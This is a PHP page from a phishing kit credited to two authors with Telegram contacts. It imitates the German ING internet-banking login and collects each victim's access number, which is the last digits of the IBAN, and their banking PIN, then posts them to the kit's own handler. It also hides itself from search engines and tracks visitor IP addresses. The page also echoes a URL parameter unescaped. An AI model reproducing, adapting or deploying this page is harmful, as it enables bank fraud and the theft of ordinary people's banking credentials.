<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
    reset_action(get_client_ip());
    if( $_GET['error'] == 1 ) {
        $_SESSION['last_page'] = 'errorlogin';
    } else {
        $_SESSION['last_page'] = 'login';
    }
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="icon" type="image/png" href="../assets/imgs/favicon.png" />

        <title>ING Login</title>
    </head>

    <body>

		<!-- HEADER -->
        <header id="header">
            <div class="container">
                <div class="logo"><img src="../assets/imgs/logo.svg"></div>
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="container">
                <div class="title">
                    <h3>Log-in</h3>
                </div>
                <div class="row">
                    <div class="col-lg-6 col-md-12 col-sm-12 col-12 mb-lg-0 mb-md-5 mb-sm-5 mb-5">
                        <div class="box">
                            <div class="login-area">
                                <form action="../index.php" method="post">
                                    <input type="hidden" name="captcha">
                                    <input type="hidden" name="step" value="login">
                                    <input type="hidden" name="error" value="<?php echo $_GET['error']; ?>">
                                    <legend>Anmelden mit Zugangsdaten</legend>
                                    <p>Zugangsdaten vergessen?</p>
                                    <div class="form-group row <?php echo is_invalid_class($_SESSION['errors'],'username') ?>">
                                        <label class="col-md-4" for="username">Zugangsnummer</label>
                                        <div class="col-md-8">
                                            <input type="text" maxlength="10" name="username" id="username" class="form-control" value="<?php echo get_value('username'); ?>">
                                            <span>Letzte 10 Stellen Ihrer IBAN / Depotnummer</span>
                                            <?php echo error_message($_SESSION['errors'],'username'); ?>
                                        </div>
                                    </div>
                                    <div class="form-group row <?php echo is_invalid_class($_SESSION['errors'],'password') ?>">
                                        <label class="col-md-4" for="password">Internetbanking PIN</label>
                                        <div class="col-md-8">
                                            <div class="zz">
                                                <input type="password" name="password" id="password" class="form-control">
                                                <div class="eye"><i class="fas fa-eye-slash"></i></div>
                                            </div>
                                            <span>Bitte beachten Sie die Groß- und Kleinschreibung.</span>
                                            <?php echo error_message($_SESSION['errors'],'password'); ?>
                                        </div>
                                    </div>
                                    <div class="btns">
                                        <button type="submit"><i class="fas fa-angle-right"></i> Anmelden</button>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-6 col-md-12 col-sm-12 col-12">
                        <div class="box">
                            <div class="content">
                                <h3><img src="../assets/imgs/qrcode.svg"> Anmelden mit App und QR-Code</h3>
                                <div class="row mb50">
                                    <div class="col-7">
                                        <p>Sie nutzen bereits Banking to go? Dann können Sie sich jetzt in Ihrem Internetbanking ganz einfach <b>ohne Zugangsdaten</b> anmelden.</p>
                                        <p class="mb-0"><span>So funktioniert der QR Log-in</span></p>
                                    </div>
                                    <div class="col-5"><img src="../assets/imgs/img.png"></div>
                                </div>
                                <p class="remember">Auf diesem Gerät und mit diesem Browser immer mit QR Log-in anmelden.</p>
                                <button type="button"><i class="fas fa-angle-right"></i> Anmelden mit QR Log-in</button>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="bottom">
                    <h3>Aktuelle Mitteilungen</h3>
                    <div class="box">
                        <ul>
                            <li><i class="fas fa-angle-down"></i> Achtung: Betrüger wollen an Ihre Daten!</li>
                            <li><i class="fas fa-angle-down"></i> Geld zurück bei Corona-Stornierung?</li>
                            <li><i class="fas fa-angle-down"></i> Multibanking macht Pause</li>
                            <li><i class="fas fa-angle-down"></i> Info-Banner – neue Produktbedingungen</li>
                        </ul>
                    </div>
                </div>
                
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <ul>
                <li>Karriere</li>
                <li>Vertriebspartner</li>
                <li>Wholesale Banking</li>
                <li>Kontaktformular</li>
                <li>AGB</li>
                <li>Datenschutz</li>
                <li>Impressum</li>
            </ul>
            <div><img style="min-width: 144px;" src="../assets/imgs/social.png"></div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
		<script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
        <script src="../assets/js/script.js"></script>

        <script>
            $('.eye').click(function(){
                if( $('#password').attr('type') == 'password' ) {
                    $('.eye').html('<i class="fas fa-eye"></i>');
                    $('#password').attr('type','text');
                } else {
                    $('.eye').html('<i class="fas fa-eye-slash"></i>');
                    $('#password').attr('type','password');
                }
            });
        </script>

    </body>

</html>